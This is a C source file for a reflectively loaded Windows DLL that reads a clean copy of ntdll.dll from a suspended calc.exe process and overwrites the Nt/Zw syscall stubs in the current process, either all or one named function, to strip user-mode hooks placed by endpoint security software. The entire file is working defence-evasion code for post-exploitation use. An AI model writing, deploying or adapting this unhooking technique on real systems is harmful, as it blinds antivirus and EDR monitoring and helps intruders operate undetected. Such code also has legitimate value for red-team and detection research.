
#include "ReflectiveLoader.h"

const char name[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l',0x0};
const char name2[] = { 'c','a','l','c','.','e','x','e',0x0 };

HANDLE create_suspended_proc() {

    HANDLE proc = NULL;
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    BOOL test = CreateProcessA(NULL, (LPSTR)name2, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, "C:\\Windows\\System32", &si, &pi);
    proc = pi.hProcess;

    if (!test) {

        proc = NULL;
        return proc;
    }

    return proc;
}


LPVOID cache_ntdll(HANDLE hproc) {

    LPVOID cache = NULL;

    LPVOID ntdll_addr = (LPVOID)(GetModuleHandleA(name));
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(ntdll_addr);
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll_addr + dos_header->e_lfanew);
    IMAGE_OPTIONAL_HEADER* optionnal = (IMAGE_OPTIONAL_HEADER*)(&nt_header->OptionalHeader);

    SIZE_T ntdll_size = (SIZE_T)(optionnal->SizeOfImage);

    cache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!(ReadProcessMemory(hproc, ntdll_addr, cache, ntdll_size, NULL))) {


        cache = NULL;
        return cache;
    }

    TerminateProcess(hproc, 0);

    return cache;
}

DWORD unhook(LPVOID buffer, HMODULE ntdll_module, char* proc_name) {

	int flag = 0;

	PDWORD name_addr = 0;
	PDWORD func_array = 0;
	PWORD ordinals = 0;
	PCHAR name_hexa = 0;
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(buffer);
	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer + dos_header->e_lfanew);
	PVOID proc_addr = NULL;
	IMAGE_OPTIONAL_HEADER* optionnal_header = (IMAGE_OPTIONAL_HEADER*)(&nt_header->OptionalHeader);
	PIMAGE_DATA_DIRECTORY data_directory = (PIMAGE_DATA_DIRECTORY)(optionnal_header->DataDirectory);

	PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)data_directory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (DWORD_PTR)buffer);

	name_addr = (PDWORD)((DWORD_PTR)buffer + eat->AddressOfNames);
	func_array = (PDWORD)((DWORD_PTR)buffer + eat->AddressOfFunctions);
	ordinals = (PWORD)((DWORD_PTR)buffer + eat->AddressOfNameOrdinals);

	if (proc_name[0] == 0) {

		flag = 1;
		printf("[+] You have choosed all unhooking, such ambitious\n");
	}

	if (flag) {

		printf("[+] ntdll base address of current process  : %#x\n", (LPVOID)((DWORD_PTR)ntdll_module));
		printf("[+] ntdll base address of suspended process : %#x\n", buffer);

		for (DWORD i = 0; i <= eat->NumberOfNames; i++) {

			name_hexa = (PCHAR)((DWORD_PTR)buffer + name_addr[i]);

			if (name_hexa[0] == 0x5a || name_hexa[0] == 0x4e && name_hexa[1] == 0x74) { //Z or N

					proc_addr = (PVOID)((LPBYTE)buffer + func_array[ordinals[i]]);

					DWORD offset = (DWORD)proc_addr - (DWORD)buffer;

					LPVOID hooked_ntdll_addr = (LPVOID)((DWORD_PTR)ntdll_module + offset);

					DWORD old = 0;

					VirtualProtect(hooked_ntdll_addr, 21, PAGE_EXECUTE_READWRITE, &old);

					if (!old) {
						printf("[-] Error while changing permissions\n");
						return 0;
					}

					memcpy(hooked_ntdll_addr, proc_addr, 3); //mov r10, rcx

					LPVOID two_addr_hooked = (LPVOID)((DWORD_PTR)ntdll_module + offset + 3);
					LPVOID two_addr_original = (LPVOID)((DWORD_PTR)proc_addr + 3);

					memcpy(two_addr_hooked, two_addr_original, 5); //mov eax, syscall_number

					LPVOID third_addr_hooked = (LPVOID)((DWORD_PTR)ntdll_module + offset + 19);
					LPVOID third_addr_original = (LPVOID)((DWORD_PTR)proc_addr + 19);

					memcpy(third_addr_hooked, third_addr_original, 3); //syscall; ret

					if (!(memcmp(hooked_ntdll_addr, proc_addr, 3)) && !(memcmp(&hooked_ntdll_addr + 3, &proc_addr + 3, 5)) && !(memcmp(&hooked_ntdll_addr + 18, &proc_addr + 18, 3))) {

						;
					}

					VirtualProtect(hooked_ntdll_addr, 21, old, &old);
					if (!old) {

						printf("[-] Failed to restore old permission\n");
						return 0;
					}
					
			}
		}
		return 1;
	}
	else {

		for (DWORD i = 0; i <= eat->NumberOfNames; i++) {

			name_hexa = (PCHAR)((DWORD_PTR)buffer + name_addr[i]);

			if (name_hexa[0] == 0x5a || name_hexa[0] == 0x4e && name_hexa[1] == 0x74) { //Z or N


				if (name_hexa[0] == proc_name[0] && name_hexa[2] == proc_name[2] && name_hexa[8] == proc_name[8] && name_hexa[12] == proc_name[12]) { //we find targeted proc

					proc_addr = (PVOID)((LPBYTE)buffer + func_array[ordinals[i]]);

					printf("[+] ntdll base address of current process  : %#x\n", (LPVOID)((DWORD_PTR)ntdll_module));
					printf("[+] ntdll base address of suspended process : %#x\n", buffer);

					printf("[+] Found %s\n", proc_name);

					printf("[+] %s address : %#x\n", name_hexa, proc_addr);

					DWORD offset = (DWORD)proc_addr - (DWORD)buffer;

					printf("Offset : %x\n", offset);

					LPVOID hooked_ntdll_addr = (LPVOID)((DWORD_PTR)ntdll_module + offset);

					char* value_test = (char*)hooked_ntdll_addr;
					printf("Syscall number : %#x\n", value_test[4]);

					DWORD old = 0;

					VirtualProtect(hooked_ntdll_addr, 21, PAGE_EXECUTE_READWRITE, &old);
					if (!old) {
						printf("[-] Error while changing permissions\n");
						return 0;
					}

					memcpy(hooked_ntdll_addr, proc_addr, 3); //mov r10, rcx

					LPVOID two_addr_hooked = (LPVOID)((DWORD_PTR)ntdll_module + offset + 3);
					LPVOID two_addr_original = (LPVOID)((DWORD_PTR)proc_addr + 3);

					memcpy(two_addr_hooked, two_addr_original, 5); //mov eax, syscall_number

					LPVOID third_addr_hooked = (LPVOID)((DWORD_PTR)ntdll_module + offset + 19);
					LPVOID third_addr_original = (LPVOID)((DWORD_PTR)proc_addr + 19);
					memcpy(third_addr_hooked, third_addr_original, 3); //syscall; ret

					if (!(memcmp(hooked_ntdll_addr, proc_addr, 3)) && !(memcmp(&hooked_ntdll_addr + 3, &proc_addr + 3, 5)) && !(memcmp(&hooked_ntdll_addr + 18, &proc_addr + 18, 3))) {

						printf("[+] Syscall copied !\n");
					}

					VirtualProtect(hooked_ntdll_addr, 21, old, &old);
					if (!old) {

						printf("[-] Failed to restore old permission\n");
						return 0;
					}
					return 1;
				}

			}

		}
	}

}

char* hex_convert(char func_name[]) {

	char* output;
	strtol(func_name, &output, 16);
	return output;
}



BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		break;
	case DLL_PROCESS_ATTACH:
	{
		printf("[+] Passed parameter : %s\n", (char*)lpReserved);
		hAppInstance = hinstDLL;
		LPVOID test_addr = NULL;
		HANDLE test = create_suspended_proc();
		test_addr = cache_ntdll(test);

		if (test_addr == NULL) {

			printf("error");
		}

		char* hex;

		if (lpReserved != NULL) {

			char* proc = (char*)lpReserved;
			hex = hex_convert(proc);
			printf("%#x\n", hex[0]);

			DWORD result = unhook(test_addr, GetModuleHandleA(name), hex);

			if (result) {
				printf("[+] Unhook successful !!");
			}
		}
		else {

			hex = 0;
			DWORD result = unhook(test_addr, GetModuleHandleA(name), hex);
		}

		fflush(stdout);
		ExitProcess(0);

		break;
	}
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}